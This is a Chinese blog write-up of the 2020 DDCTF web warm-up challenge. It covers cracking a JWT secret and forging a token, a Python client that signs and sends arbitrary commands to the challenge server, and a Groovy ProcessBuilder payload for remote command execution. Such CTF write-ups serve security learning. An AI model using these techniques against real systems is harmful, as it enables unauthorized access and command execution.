<!--yml
category: 未分类
date: 2022-04-26 14:46:27
-->

# 2020年DDCTF-web签到题题解_slug01sh的博客-CSDN博客

> 来源：[https://blog.csdn.net/qq_43085611/article/details/108587268](https://blog.csdn.net/qq_43085611/article/details/108587268)

![](img/788aea1d1aff09f7f6c24e771ff7a283.png)
2020 年 DDCTF 中 web 签到题题解。（web🐶只做出来这道题，第二天有事）

# web签到题

## 步骤1：JWT绕过

图1:题目给定初始条件。
![](img/12a241d5379b4bcd77415ea246d6191e.png)

向 api 发送请求，得到响应如下，data 的数据格式和 jwt 相似，猜测为 jwt 绕过。

```
{
	"code": 0,
	"message": "success",
	"data": 		"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6InN0ciIsInB3ZCI6InN0ciIsInVzZXJSb2xlIjoiR1VFU1QiLCJleHAiOjE1OTkyODY0NzB9.z-i_zjudu5yejiFbCnE9P5NIjOJE61Bzpw75OX1SHmg"
} 
```

我只做过一次 JWT 绕过的题目，并且当时记笔记的习惯不好，早已忘记。于是先查询了一下 JWT 相关原理和基本步骤，初略指导该漏洞可以使用 5 种方式进行攻击。考虑从最简单的暴力破解 key 开始尝试，使用 [Junay 大佬博客](https://delcoding.github.io/2018/03/jwt-bypass/)推荐的[工具](https://github.com/brendan-rius/c-jwt-cracker)进行尝试，爆破出密码为 str（不同的人密码可能不同），然后到 [https://jwt.io/](https://jwt.io) 进行 jwt 伪造，将伪造后的 jwt 发送到 auth interface 得到 client 下载链接。

图2:爆破得到的密码
![](img/d7b9d7f8cbb1a83822f042bd9c156237.png)

## 步骤2：逆向绕过客户端

获得 client 后，由队里的其他大佬进行逆向分析，并制作模拟客户端的工具。

```
 from base64 import b64encode
import hmac
import hashlib
from time import time
import requests
import json
from pprint import pprint

while True:
    cmd = input()  

    appkey = "DDCTFWithYou"
    time_stamp = str(int(time()))
    strToSign = cmd + '|' + time_stamp

    sha = hmac.new(
        bytes(appkey, encoding='utf-8'),
        bytes(strToSign, encoding='utf-8'),
        digestmod=hashlib.sha256
    ).digest()
    sign = bytes.decode(
        b64encode(sha)
    )

    url = "http://117.51.136.197/server/command"
    data = {
        "signature": sign,
        "command": cmd,
        "timestamp": time_stamp
    }
    res = requests.post(
        url=url,
        data=json.dumps(data)
    )
    pprint(res.text) 
```

## 步骤3：命令执行

判断后端语言，构造 payload。首先利用语言的运算符测试是否执行，总结存在哪些运算符，然后测试出字符串可以使用 length 函数，猜测可能该语言为「面向对象语言」，从逻辑运算符 != 和 length 函数猜测可能是 [Java 衍生的语言](https://coolshell.cn/articles/2631.html)（输入的命令以 # 定义变量，可使用 #a=1 测试）——[**Groovy**](http://groovy.codehaus.org/)，但是始终无法完美匹配。最终在一篇[博客](https://zhuanlan.kanxue.com/article-12714.htm)找到突破点，文章中的很多情景很符合该题目，测试 java.lang.String.class.forName("java.lang.Runtime”) 时出现 command is evil，断定为 Groovy。于是便开始寻找 Java 命令注入代码，[网上大多数的命令执行](https://y4er.com/post/java-exec-command/)大都是使用 Runtime 类或 Processbuider 类，但都是多行代码的形式，[CVE-2015-1427 的 exploit](https://github.com/t0kx/exploit-CVE-2015-1427/blob/master/exploit.sh) 也无法执行。网上的命名只有一行为命令执行，我们猜测可以采用乱码方式进行回显，然后在本地解码，然后从 IDEA 自动补全找到 readAllBytes 函数，将数据读出。然后把读出的数据使用 Base64 解码就得到命令执行的结果。

图3：编程语言分类
![](img/7d23511d15c806f6efe2db00715468dc.png)

code：一些关键性的测试

```
1 == true

{1}
'abc'.length()
'abc'.concat('d')
'12 '.trim()
'1234'.getBytes()
'hello'.startsWith('1')
new ProcessBuilder("ls").start().getInputStream().readAllBytes() 
```

图4：使用 readAllBytes 读出数据
![image-20200913234130453](img/deb96f2877218f3fd2e5242debab5856.png)

将读出的数据使用 base64 解开即可。